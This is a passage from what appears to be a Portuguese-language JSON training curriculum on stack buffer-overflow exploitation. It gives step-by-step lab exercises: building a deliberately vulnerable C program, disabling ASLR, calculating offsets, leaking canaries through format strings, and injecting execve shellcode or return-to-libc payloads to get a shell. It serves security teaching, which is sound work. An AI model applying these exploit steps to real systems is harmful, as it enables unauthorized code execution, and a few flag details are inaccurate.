                              "practicalExample": "Compile 'int vuln(char* a, char* b, int c) { char buf[64]; strcpy(buf,a); }' em 32 e 64 bits. Use GDB para overflow buf: em x86, offset ~76 para RET (4-byte ptrs); em x64, ~136 (8-byte ptrs + reg args). Payload x86: 'A'*72 + ret_addr; x64: 'A'*128 + shadow_space + ret_addr, com args em rdi/etc.",
                              "finalVerifications": [
                                "Desenhar diagramas precisos de pilha x86 vs x64 com offsets rotulados.",
                                "Calcular offset exato de buffer para RET em ambos usando cyclic patterns.",
                                "Explicar verbalmente 3 diferenças chave e seu impacto em exploits.",
                                "Adaptar um PoC exploit de x86 para x64 com sucesso.",
                                "Identificar calling convention correto (System V) em disasm x64.",
                                "Comparar tamanhos de shellcode necessários devido a ponteiros maiores."
                              ],
                              "assessmentCriteria": [
                                "Precisão nos diagramas e offsets (erro <5 bytes).",
                                "Compreensão de registradores vs pilha em passing de argumentos.",
                                "Correta identificação de alinhamentos e shadow space.",
                                "Sucesso em exploits práticos em ambas arquiteturas.",
                                "Análise qualitativa de impactos em segurança (ex: ROP mais complexo em x64).",
                                "Uso correto de ferramentas (GDB commands, ABI docs)."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Calling conventions e registradores.",
                                "Programação em Assembly: Disassembly e manipulação de pilha.",
                                "Sistemas Operacionais: ABIs e gerenciamento de memória.",
                                "Engenharia Reversa: Análise binária com objdump/radare2.",
                                "Redes e Segurança: Desenvolvimento de exploits em pentests."
                              ],
                              "realWorldApplication": "Em auditorias de segurança e CTFs (ex: pwn challenges), entender diferenças x86/x64 permite portar exploits para targets modernos (maioria 64-bit), evitando falhas em offsets durante buffer overflows em serviços como web servers ou kernels."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.1.1.2",
                        "name": "Mecânica da Sobrescrita de Buffer",
                        "description": "Explorar como entradas excessivas em funções como strcpy, gets ou arrays locais sobrescrevem memória adjacente na pilha, alterando variáveis, pointers e controle de fluxo, com exemplos em C compilado para binários ELF.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.1.1.2.1",
                            "name": "Criar programa vulnerável a buffer overflow",
                            "description": "Escrever e compilar (com flags -fno-stack-protector -z execstack) um programa C simples com buffer local sobrescritível, demonstrando crash por corrupção de EIP/RIP via input malicioso.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o Ambiente de Desenvolvimento Vulnerável",
                                  "subSteps": [
                                    "Instale o GCC em um ambiente Linux (ex: Ubuntu ou Kali) usando 'sudo apt install gcc'.",
                                    "Desabilite proteções do sistema: execute 'echo 0 | sudo tee /proc/sys/kernel/randomize_va_space' para desabilitar ASLR temporariamente.",
                                    "Crie um diretório de trabalho: 'mkdir buffer_overflow_lab && cd buffer_overflow_lab'.",
                                    "Verifique a arquitetura do sistema com 'uname -m' (deve ser x86_64 ou i686).",
                                    "Teste o GCC com 'gcc --version' para confirmar instalação."
                                  ],
                                  "verification": "Comandos executados sem erros e ASLR desabilitado (verifique com 'cat /proc/sys/kernel/randomize_va_space').",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal Linux",
                                    "GCC compiler",
                                    "Editor de texto (vim/nano)"
                                  ],
                                  "tips": "Use uma VM isolada para evitar riscos de segurança reais.",
                                  "learningObjective": "Preparar um ambiente controlado sem proteções modernas para simular vulnerabilidades antigas.",
                                  "commonMistakes": [
                                    "Esquecer de desabilitar ASLR, causando endereços imprevisíveis",
                                    "Usar Windows sem WSL, complicando flags",
                                    "Manter stack protector ativado por padrão"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Escrever o Código C com Buffer Vulnerável",
                                  "subSteps": [
                                    "Crie um arquivo 'vuln.c' com #include <stdio.h> e #include <string.h>.",
                                    "Defina main(int argc, char** argv) com char buf[64]; no stack local.",
                                    "Use strcpy(buf, argv[1]); sem verificação de tamanho.",
                                    "Adicione printf(\"Buf: %s\\n\", buf); e return 0;.",
                                    "Salve o arquivo e verifique sintaxe com 'gcc -Wall vuln.c -o /dev/null'."
                                  ],
                                  "verification": "Código salva sem erros de sintaxe e contém buffer local de tamanho fixo com strcpy.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de texto",
                                    "Conhecimento básico de C"
                                  ],
                                  "tips": "Mantenha o buffer pequeno (64 bytes) para facilitar overflow manual.",
                                  "learningObjective": "Implementar uma vulnerabilidade clássica de buffer overflow em C usando funções inseguras.",
                                  "commonMistakes": [
                                    "Usar strncpy em vez de strcpy",
                                    "Passar buffer grande demais, impedindo overflow",
                                    "Esquecer de usar argv[1] para input externo"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Compilar o Programa com Flags Vulneráveis",
                                  "subSteps": [
                                    "Compile com 'gcc -fno-stack-protector -z execstack -o vuln vuln.c'.",
                                    "Verifique o binário com 'file vuln' (deve mostrar 'ELF 64-bit executable, x86-64').",
                                    "Confirme ausência de proteções: 'readelf -h vuln | grep STACK' (sem 'GNU_STACK RWX').",
                                    "Teste execução básica: './vuln teste' (deve imprimir 'Buf: teste').",
                                    "Anote o tamanho do buffer e offset aproximado para EIP (use gdb para medir depois)."
                                  ],
                                  "verification": "Binário compila e executa input normal sem crash, com flags confirmadas via readelf.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "GCC com flags específicas",
                                    "readelf utility"
                                  ],
                                  "tips": "-z execstack permite execução no stack; essencial para exploits reais.",
                                  "learningObjective": "Compilar binários desprotegidos para demonstrar vulnerabilidades de stack.",
                                  "commonMistakes": [
                                    "Omitir -fno-stack-protector, ativando canário",
                                    "Usar -pie, randomizando endereços",
                                    "Compilar com otimizações (-O2) que alteram layout"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Demonstrar Overflow e Crash por Corrupção de EIP/RIP",
                                  "subSteps": [
                                    "Gere input malicioso: 'python3 -c \"print(\\\"A\\\"*100)\" > payload.txt'.",
                                    "Execute './vuln $(cat payload.txt)' e observe segfault.",
                                    "Use gdb: 'gdb ./vuln', 'run $(python3 -c \"print(\\\"A\\\"*100)\")', 'info registers' para ver EIP corrompido com 0x41414141.",
                                    "Ajuste payload para ~100-120 bytes (depende da arquitetura) até crash consistente.",
                                    "Documente o offset exato com cyclic pattern (ex: gdb-peda cyclic 200)."
                                  ],
                                  "verification": "Programa crasha com segfault e gdb mostra EIP/RIP sobrescrito (ex: 0x41414141).",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GDB debugger",
                                    "Python3 para payloads"
                                  ],
                                  "tips": "Instale gdb-peda para padrões cíclicos: facilita encontrar offset exato.",
                                  "learningObjective": "Reproduzir e verificar corrupção de controle de fluxo via overflow.",
                                  "commonMistakes": [
                                    "Payload curto demais, sem alcançar EIP",
                                    "ASLR ativo, impedindo reprodutibilidade",
                                    "Ignorar endianness em little-endian x86"
                                  ]
                                }
                              ],
                              "practicalExample": "Código vuln.c: #include <stdio.h>\\n#include <string.h>\\nint main(int argc, char** argv) { char buf[64]; strcpy(buf, argv[1]); printf(\"Buf: %s\\n\", buf); return 0; }\\nCompilar: gcc -fno-stack-protector -z execstack -o vuln vuln.c\\nTeste overflow: ./vuln $(python3 -c 'print(\"A\"*100)') → Segfault, gdb confirma EIP=0x41414141.",
                              "finalVerifications": [
                                "Programa compila sem warnings com flags corretas.",
                                "Input normal (<64 bytes) executa e imprime corretamente.",
                                "Input malicioso (>80 bytes) causa segfault imediato.",
                                "GDB mostra EIP/RIP corrompido com bytes do payload.",
                                "Offset de overflow reproduzível sem ASLR.",
                                "Binário tem stack executável (readelf confirma)"
                              ],
                              "assessmentCriteria": [
                                "Código usa strcpy em buffer stack local sem bounds check.",
                                "Flags de compilação exatas: -fno-stack-protector e -z execstack.",
                                "Demonstração inclui crash reproduzível e análise via GDB.",
                                "Documentação explica mecânica: overflow → sobrescrita de saved RIP → jump inválido.",
                                "Ambiente preparado corretamente (ASLR off).",
                                "Payload ajustado para corrupção precisa de EIP."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Manipulação de strings e memória.",
                                "Assembly x86: Entender stack frame e registradores EIP/RIP.",
                                "Ética em Cibersegurança: Uso responsável de exploits educacionais.",
                                "Análise de Binários: Ferramentas como GDB e readelf.",
                                "Desenvolvimento Seguro: Identificar CWE-120 (Buffer Overflow)."
                              ],
                              "realWorldApplication": "Buffer overflows foram base de exploits históricos como Code Red e Slammer worms; hoje, entender mecânica é essencial para pentesters em CTFs (ex: PicoCTF), auditores de código seguro (evitar em apps IoT/bancários) e analistas de malware reverse engineering binários vulneráveis."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.1.2.2",
                            "name": "Calcular offset exato para sobrescrita de retorno",
                            "description": "Usar padrões cíclicos (cyclic patterns via msf-pattern_create) no GDB para determinar o offset preciso entre início do buffer e endereço de retorno, permitindo controle preciso da sobrescrita.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Gerar Padrão Cíclico Único com msf-pattern_create",
                                  "subSteps": [
                                    "Instale o Metasploit Framework se necessário (sudo apt install metasploit-framework).",
                                    "Execute o comando: msf-pattern_create -l 300 (ajuste o comprimento para exceder o buffer esperado, ex: 300 bytes).",
                                    "Salve a saída em um arquivo: padrão.txt.",
                                    "Copie o conteúdo para uso como input (ex: via arquivo ou pipe)."
                                  ],
                                  "verification": "Verifique se o padrão gerado é único e cíclico sem repetições óbvias usando um editor de texto ou hexdump.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Metasploit Framework (msf-pattern_create)",
                                    "Editor de texto",
                                    "Terminal Linux"
                                  ],
                                  "tips": "Use um comprimento maior que o buffer + offset estimado para garantir overflow.",
                                  "learningObjective": "Entender como padrões cíclicos únicos facilitam a identificação precisa de offsets em overflows.",
                                  "commonMistakes": "Gerar padrões curtos demais que não causem overflow ou usar padrões repetitivos simples como 'A's'."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Preparar e Executar Programa Vulnerável no GDB",
                                  "subSteps": [
                                    "Compile o binário vulnerável com debug: gcc -g -fno-stack-protector -z execstack -o vuln vuln.c.",
                                    "Inicie o GDB: gdb ./vuln.",
                                    "Configure input: (gdb) run < padrão.txt ou use python para input dinâmico.",
                                    "Execute até crash: (gdb) run."
                                  ],
                                  "verification": "Confirme que o programa crasha com Segmentation Fault no GDB.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Código fonte vuln.c (ex: buffer local de tamanho fixo)",
                                    "GCC compiler",
                                    "GDB debugger"
                                  ],
                                  "tips": "Desabilite proteções como ASLR temporariamente: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space.",
                                  "learningObjective": "Dominar a execução controlada de binários vulneráveis em ambiente de debug.",
                                  "commonMistakes": "Esquecer flags de compilação como -fno-stack-protector, impedindo overflow."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o Crash e Identificar Valor Sobrescrito no EIP",
                                  "subSteps": [
                                    "Após crash, examine registradores: (gdb) info registers.",
                                    "Note o valor em EIP/RIP (ex: 0x41326641).",
                                    "Use (gdb) x/20x $esp para inspecionar stack próximo ao retorno.",
                                    "Confirme que o valor em EIP corresponde a parte do padrão.",
                                    "Anote o valor exato sobrescrito (ex: Aa2A)."
                                  ],
                                  "verification": "O EIP contém bytes do padrão gerado, indicando sobrescrita bem-sucedida.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "GDB ativo na sessão de crash"
                                  ],
                                  "tips": "Use (gdb) bt para backtrace e confirme o frame de retorno.",
                                  "learningObjective": "Interpretar dumps de registradores e stack para localizar sobrescrita de retorno.",
                                  "commonMistakes": "Confundir EIP com outros registradores ou ignorar endianness little-endian."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Calcular Offset Exato com msf-pattern_offset",
                                  "subSteps": [
                                    "Copie o valor do EIP sobrescrito (ex: 0x41326641).",
                                    "Execute: msf-pattern_offset -q 41326641.",
                                    "Anote o offset retornado (ex: offset 116).",
                                    "Teste: gere payload com offset + NOPs + shellcode e verifique controle de EIP.",
                                    "Ajuste se necessário com offsets próximos."
                                  ],
                                  "verification": "msf-pattern_offset retorna um número inteiro positivo; teste injetando offset + endereço fixo causa jump previsível.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Saída do GDB (valor EIP)",
                                    "msf-pattern_offset"
                                  ],
                                  "tips": "Converta hex para string ASCII se necessário para o comando.",
                                  "learningObjective": "Aplicar ferramenta para quantificar precisamente a distância do buffer ao retorno.",
                                  "commonMistakes": "Inserir valor EIP em formato errado (use hex sem 0x) ou ignorar ordem de bytes."
                                }
                              ],
                              "practicalExample": "Em um programa C com char buf[64]; gets(buf);, gere padrão de 200 bytes. Após overflow no GDB, EIP=0x61413661 ('a1Aa'). msf-pattern_offset -q 61413661 retorna 72, significando 72 bytes do input sobrescrita o retorno.",
                              "finalVerifications": [
                                "Offset permite EIP controlado com input de tamanho exato (offset + 4 bytes).",
                                "Reprodução consistente em múltiplas execuções sem ASLR.",
                                "Padrão + offset alinha shellcode corretamente no stack.",
                                "GDB confirma jump para endereço desejado (ex: NOP sled).",
                                "Exploit básico (offset + JMP ESP) abre shell.",
                                "Nenhum falso positivo em offsets adjacentes."
                              ],
                              "assessmentCriteria": [
                                "Precisão do offset (erro <1 byte).",
                                "Uso correto e sequencial de msf-pattern_create e offset.",
                                "Análise completa de GDB (registradores + stack).",
                                "Teste de verificação com payload funcional.",
                                "Documentação clara do processo e valores.",
                                "Eficiência temporal dentro dos estimates.",
                                "Identificação de erros comuns evitados."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entendimento de stacks e buffers.",
                                "Assembly x86: Leitura de registradores EIP/ESP.",
                                "Debugging: Proficiência em GDB commands.",
                                "Matemática: Cálculos de offsets e alinhamento de memória.",
                                "Redes/Segurança: Contexto de exploits remotos."
                              ],
                              "realWorldApplication": "Em penetration testing e desenvolvimento de exploits (ex: CTFs, bug bounties), calcular offsets exatos permite crafting de payloads confiáveis para buffer overflows em serviços reais como FTP/HTTP servers vulneráveis, facilitando injeção de shellcode remoto."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.1.2.3",
                            "name": "Burlar proteções básicas como canaries",
                            "description": "Identificar e simular bypass de stack canaries em cenários sem ASLR, observando leaks via format strings ou erros de lógica para obter valores e sobrescrever seletivamente.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Mecanismo de Stack Canaries",
                                  "subSteps": [
                                    "Estude o conceito de stack canaries como valores aleatórios inseridos pelo compilador entre variáveis locais e o frame pointer/retorno.",
                                    "Analise o fluxo de execução em uma função vulnerável: push canary, uso de buffer, pop canary com verificação.",
                                    "Revise assembly gerado com gdb para identificar a inserção/verificação do canary (ex: mov %gs:0x14, %eax).",
                                    "Diferencie canaries de ASLR: canaries são por-thread e regenerados, mas vazáveis.",
                                    "Pratique desabilitando canaries temporariamente com -fno-stack-protector para comparar crashes."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito como o canary é verificado e por que falha em overflows sem bypass.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação GCC (stack protector), gdb/pwndbg, exemplos de código C simples com buffer local.",
                                  "tips": "Use 'info registers' no gdb para observar registradores durante verificação.",
                                  "learningObjective": "Dominar o papel e ciclo de vida dos stack canaries em proteções de stack.",
                                  "commonMistakes": "Confundir canary com ASLR; assumir canary global em vez de por-thread."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Ambiente de Teste sem ASLR",
                                  "subSteps": [
                                    "Compile um binário C vulnerável com stack protector ativado: gcc -fno-stack-protector-all -z execstack -no-pie vuln.c -o vuln.",
                                    "Desabilite ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space.",
                                    "Crie buffer overflow básico: input excede buffer até ret address, observe crash no canary check via gdb.",
                                    "Confirme canary ativo: strace ou gdb mostra SIGABRT em __stack_chk_fail.",
                                    "Documente offsets: use cyclic patterns (ex: gdb-peda) para achar posição exata do canary."
                                  ],
                                  "verification": "Execute overflow sem leak e confirme crash específico em canary (não em ret addr).",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Código C vulnerável (buffer local + printf para leak posterior), gdb/pwndbg, cyclic de pwntools.",
                                  "tips": "Rode em VM isolada para segurança; use setarch x86_64 -R para ASLR off persistente.",
                                  "learningObjective": "Preparar ambiente reproduzível para isolar bypass de canary.",
                                  "commonMistakes": "Esquecer -no-pie ou deixar ASLR on, causando endereços variáveis."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e Explorar Fontes de Leak de Canary",
                                  "subSteps": [
                                    "Introduza vulnerabilidade de format string no binário: printf(user_input) antes do buffer overflow.",
                                    "Use %p ou %s em inputs para dump da stack, identificando bytes do canary (padrão: XX XX XX 00).",
                                    "Simule erros de lógica: retorne valores stack-based vazados inadvertidamente.",
                                    "Extraia partial leaks: foque nos primeiros 3 bytes (último é sempre 00).",
                                    "Automatize leak com pwntools: envie payload format e parse resposta."
                                  ],
                                  "verification": "Capture leak estável do canary via gdb ou netcat, confirmando padrão (ex: bytes fixos em run sem ASLR).",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Binário com format string vuln, pwntools/python para scripts, gdb com 'x/50gx $rsp'.",
                                  "tips": "Canary leak via %p em stack order; ignore ponteiro nulo no final.",
                                  "learningObjective": "Reconhecer e explorar canais comuns de informação disclosure para canaries.",
                                  "commonMistakes": "Usar %x em vez de %p para pointers; ignorar endianness em leaks."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Extrair e Validar Valor do Canary",
                                  "subSteps": [
                                    "Parse leak para isolar 4-7 bytes do canary (ex: regex ou offset fixo na resposta format).",
                                    "Valide em gdb: compare leak com valor real via 'x/gx $rbp-8' ou similar.",
                                    "Padronize extração: script python para brute-force partial canary se necessário (mas foque leak direto).",
                                    "Teste estabilidade: rode múltiplas vezes, confirme regeneração por-thread se aplicável.",
                                    "Armazene canary leaked para uso no payload final."
                                  ],
                                  "verification": "Leak corresponde exatamente ao canary no gdb durante runtime da vuln.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Script pwntools para leak/parse, gdb para validação manual.",
                                  "tips": "Use pwndbg 'canary' command se disponível para cheat-sheet.",
                                  "learningObjective": "Converter leaks brutos em valores canary utilizáveis.",
                                  "commonMistakes": "Bruteforce desnecessário com leak disponível; erro em byte order."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Construir e Executar Payload de Bypass",
                                  "subSteps": [
                                    "Craft payload: padding + canary leaked (7 bytes + \\x00) + padding + ret addr (ex: system('/bin/sh')).",
                                    "Teste em gdb: stepi até verificação, confirme bypass sem abort.",
                                    "Automatize full exploit com pwntools: leak stage + overflow stage.",
                                    "Verifique ROP ou shellcode execution pós-bypass.",
                                    "Re-habilite ASLR e note limitações (leak ainda possível se canal persistir)."
                                  ],
                                  "verification": "Exploit ganha shell ou controla RIP sem crash em canary check.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Pwntools para payload crafting, gdb para debug, binário final.",
                                  "tips": "Alinhe padding exato com cyclic; use \\x00 no final do canary.",
                                  "learningObjective": "Integrar leak em payload efetivo para bypass completo.",
                                  "commonMistakes": "Offset errado pós-canary; esquecer null-byte terminator."
                                }
                              ],
                              "practicalExample": "Considere vuln.c: int main() { char buf[64]; printf('Input leak: '); gets(input); printf(input); gets(buf); }. Compile com -fstack-protector. Leak via '%p %p %p...' captura canary em posição ~6. Payload: 'A'*offset + canary_leaked + 'B'*8 + p64(pop_rdi_ret). Rode python -c 'print payload' | ./vuln' para shell.",
                              "finalVerifications": [
                                "Overflow bypassa canary sem __stack_chk_fail.",
                                "Retorno é controlado (RIP alterado para gadget/shellcode).",
                                "Leak é reproduzível em múltiplas runs sem ASLR.",
                                "Explicação escrita cobre leak sources e payload structure.",
                                "Script automatizado roda em <5s com sucesso >90%.",
                                "Diferença clara vs. overflow sem bypass (crash imediato)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de leak channels (format/logic) - 20%.",
                                "Correção do payload crafting com canary - 25%.",
                                "Automação e reproducibilidade do exploit - 20%.",
                                "Análise assembly/gdb de verificação - 15%.",
                                "Documentação de steps e erros evitados - 10%.",
                                "Ética: ênfase em uso educacional/pentest - 10%."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: offsets de stack e calling conventions.",
                                "Engenharia Reversa: uso de gdb/pwndbg para análise dinâmica.",
                                "Redes/Segurança: impactos em protocolos com format strings (ex: FTP).",
                                "Sistemas Operacionais: memória thread-local e ASLR interações.",
                                "CTF/Pentesting: padrões de exploits em plataformas como pwn.college."
                              ],
                              "realWorldApplication": "Em pentests éticos (ex: bug bounties), bypass de canaries via leaks em serviços legacy permite chain com ROP para RCE; comum em CTFs e análise de malwares que exploram apps sem mitigações modernas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.1.1.3",
                        "name": "Injeção e Execução de Código Arbitrário",
                        "description": "Redirecionar o fluxo de execução para shellcode injetado ou funções existentes (ROP), utilizando buffer overflow para executar chamadas de sistema como execve('/bin/sh') em binários ELF, integrando conceitos de assembly e shellcodes.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.1.1.3.1",
                            "name": "Escrever e injetar shellcode simples",
                            "description": "Criar shellcode em assembly (ex: execve shellcode de 23 bytes para x86) usando nasm, testá-lo standalone e injetá-lo via overflow, alinhando com NOP sled e endereço de retorno para o buffer.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Escrever shellcode em Assembly para execve('/bin/sh')",
                                  "subSteps": [
                                    "Pesquise os números de syscall para execve em x86 Linux (ex: 11 para execve).",
                                    "Defina as strings '/bin/sh' e um ponteiro nulo em memória usando push e mov.",
                                    "Monte os registradores: ebx para path, ecx para argv (ponteiro para path e NULL), edx para envp (NULL).",
                                    "Insira a instrução int 0x80 para invocar a syscall.",
                                    "Otimize para menos de 25 bytes, evitando bytes nulos (0x00)."
                                  ],
                                  "verification": "Use objdump -d para disassemblar e confirme que o código gera execve('/bin/sh') sem bytes nulos.",
                                  "estimatedTime": "1-2 hours",
                                  "materials": [
                                    "Editor de texto (Vim/Nano)",
                                    "NASM assembler",
                                    "Documentação de syscalls Linux x86"
                                  ],
                                  "tips": "Use push em vez de mov para strings para evitar null bytes; teste com echo para verificar bytes.",
                                  "learningObjective": "Entender como criar shellcode position-independent e null-free em assembly x86.",
                                  "commonMistakes": [
                                    "Inserir bytes nulos com mov direct",
                                    "Esquecer de alinhar ponteiros para argv/envp",
                                    "Usar registradores errados para syscalls"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compilar e testar shellcode standalone",
                                  "subSteps": [
                                    "Salve o código como shellcode.asm e compile com 'nasm -f elf shellcode.asm -o shellcode.o'.",
                                    "Link com 'ld -m elf_i386 shellcode.o -o shellcode'.",
                                    "Execute './shellcode' e verifique se abre um shell interativo.",
                                    "Extraia bytes com 'objdump -d shellcode | grep -Po '\\x\\x[^\\s]' | tr -d '\\n' | xxd -r -p | hd'.",
                                    "Confirme tamanho (ex: 23 bytes) e ausência de bad chars."
                                  ],
                                  "verification": "Shellcode executa e spawna /bin/sh; hexdump mostra 23 bytes sem 0x00.",
                                  "estimatedTime": "30-45 minutes",
                                  "materials": [
                                    "NASM",
                                    "ld linker",
                                    "objdump",
                                    "xxd",
                                    "hexdump"
                                  ],
                                  "tips": "Execute em ambiente isolado (VM) para segurança; use gdb para debug se falhar.",
                                  "learningObjective": "Validar shellcode de forma independente antes da injeção.",
                                  "commonMistakes": [
                                    "Falha no linking por seções erradas",
                                    "Execução sem privilégios corretos",
                                    "Ignorar ASLR (desative para testes)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Preparar programa vulnerável a buffer overflow",
                                  "subSteps": [
                                    "Escreva um C simples com strcpy sem bounds check (ex: buffer de 64 bytes).",
                                    "Compile com 'gcc -m32 -fno-stack-protector -z execstack -no-pie vuln.c -o vuln'.",
                                    "Use gdb para encontrar offset do EIP (ex: cyclic pattern com gdb-peda).",
                                    "Determine endereço do buffer com gdb info registers ou pattern_create.",
                                    "Desative ASLR com 'echo 0 > /proc/sys/kernel/randomize_va_space'."
                                  ],
                                  "verification": "Em gdb, input de 100+ 'A's sobrescreve EIP; offset exato causa segfault controlado.",
                                  "estimatedTime": "45-60 minutes",
                                  "materials": [
                                    "GCC",
                                    "GDB com peda",
                                    "Cyclic pattern generator (pwntools ou manual)"
                                  ],
                                  "tips": "Use gdb-peda para 'pattern offset'; teste em 32-bit para simplicidade.",
                                  "learningObjective": "Identificar e quantificar vulnerabilidades de stack overflow.",
                                  "commonMistakes": [
                                    "Compilar com stack protector ativo",
                                    "Esquecer -m32 em 64-bit host",
                                    "ASLR ativado causando endereços variáveis"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Construir payload e injetar shellcode via overflow",
                                  "subSteps": [
                                    "Crie NOP sled: 100-200 \\x90 (NOP).",
                                    "Anexe shellcode bytes após sled.",
                                    "Preencha até offset com junk (\\x41), então endereço de retorno para início do buffer (little-endian).",
                                    "Gere payload: python -c 'print(\"A\"*offset + \"\\x90\"*100 + shellcode + addr)' > exploit.txt.",
                                    "Execute './vuln < exploit.txt' ou via gdb run < exploit.txt."
                                  ],
                                  "verification": "Payload spawna shell interativo; gdb confirma EIP aponta para NOP sled/shellcode.",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "Python para payload",
                                    "GDB",
                                    "Hex editor opcional"
                                  ],
                                  "tips": "Alinhe endereço com 4-byte boundary; aumente sled se desalinhado.",
                                  "learningObjective": "Integrar shellcode em exploit completo com sled e ROP básico.",
                                  "commonMistakes": [
                                    "Endereço em big-endian",
                                    "NOP sled muito curto",
                                    "Shellcode com bad chars filtrados pelo input"
                                  ]
                                }
                              ],
                              "practicalExample": "Escreva um shellcode de 23 bytes para execve('/bin/sh\\x00', ['/bin/sh\\x00', 0], 0), compile para 'sc.bin', encontre offset 112 em vuln.c, crie payload \"\\x41\"*112 + \"\\x90\"*32 + sc_bytes + \"\\x08\\xec\\xff\\xbf\"*2 (endereço buffer 0xbffffbf8), execute para shell.",
                              "finalVerifications": [
                                "Shellcode standalone spawna shell sem crashes.",
                                "Offset exato sobrescreve EIP consistentemente.",
                                "Exploit roda sem ASLR e ganha shell interativo.",
                                "Hexdump do payload confirma ausência de null bytes.",
                                "GDB mostra fluxo para NOP sled e shellcode.",
                                "Tamanho total do shellcode < 25 bytes."
                              ],
                              "assessmentCriteria": [
                                "Shellcode null-free e position-independent.",
                                "Offset preciso calculado via debugging.",
                                "Payload inclui sled, shellcode e return-to-buffer alinhado.",
                                "Execução bem-sucedida em ambiente controlado.",
                                "Explicação clara de cada syscall e registro usado.",
                                "Identificação e mitigação de 3+ erros comuns."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86 (Linguagens de Baixo Nível)",
                                "Sistemas Operacionais (Syscalls e Processos)",
                                "Redes e Segurança (Ethical Hacking e Pentesting)",
                                "Programação em C (Gerenciamento de Memória)",
                                "Análise Reversa (Disassembly e Debugging)"
                              ],
                              "realWorldApplication": "Em pentesting, desenvolvedores usam isso para demonstrar impactos de buffer overflows em software legado, ajudando a priorizar patches; analistas de malware dissecam shellcodes em exploits reais para detecção em AV/IDS."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.1.3.2",
                            "name": "Explorar com return-to-libc",
                            "description": "Identificar endereços de system() e '/bin/sh' em libc via ldd/objdump, redirecionando retorno para chain system('/bin/sh') sem injetar código, simulando cenários sem W^X.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o Ambiente de Teste",
                                  "subSteps": [
                                    "Criar um programa C vulnerável a buffer overflow com função main que chama uma função suscetível (ex: strcpy sem bounds check).",
                                    "Compilar o binário com flags para desabilitar proteções: gcc -m32 -fno-stack-protector -z execstack -no-pie vuln.c -o vuln.",
                                    "Verificar ASLR desabilitado: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space.",
                                    "Instalar e preparar ferramentas: gdb, ldd, objdump, readelf.",
                                    "Testar o binário com input longo para confirmar crash (ex: python -c 'print(\"A\"*100)' | ./vuln)."
                                  ],
                                  "verification": "Binário compila sem erros, crasha previsivelmente com overflow e é debugável no GDB.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "GCC compiler",
                                    "GDB debugger",
                                    "Binário libc.so",
                                    "Editor de texto"
                                  ],
                                  "tips": "Use arquitetura 32-bit para simplicidade inicial; sempre teste em ambiente isolado como VM.",
                                  "learningObjective": "Preparar um ambiente controlado e reproduzível para exploração de vulnerabilidades sem proteções modernas.",
                                  "commonMistakes": [
                                    "Compilar com stack protector ativo",
                                    "Deixar ASLR habilitado",
                                    "Usar 64-bit sem ajustes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Endereços Críticos em libc",
                                  "subSteps": [
                                    "Executar ldd ./vuln para localizar o caminho da libc usada.",
                                    "Usar objdump -D /lib/i386-linux-gnu/libc.so.6 | grep -i system para encontrar endereço de system().",
